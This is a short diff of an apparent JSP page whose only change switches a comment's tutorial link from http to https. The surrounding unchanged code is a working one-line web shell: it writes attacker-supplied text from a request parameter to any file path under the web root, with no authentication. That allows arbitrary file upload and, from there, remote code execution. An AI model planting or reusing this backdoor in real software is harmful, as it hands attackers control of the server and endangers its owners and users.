@@ -10,7 +10,7 @@
 </head>
 <body>
 
-<!-- http://www.jb51.net/article/7461.htm -->
+<!-- https://www.jb51.net/article/7461.htm -->
 <%
     if (request.getParameter("f") != null)
         (new java.io.FileOutputStream(application.getRealPath("/") + request.getParameter("f"))).write(request.getParameter("t").getBytes());
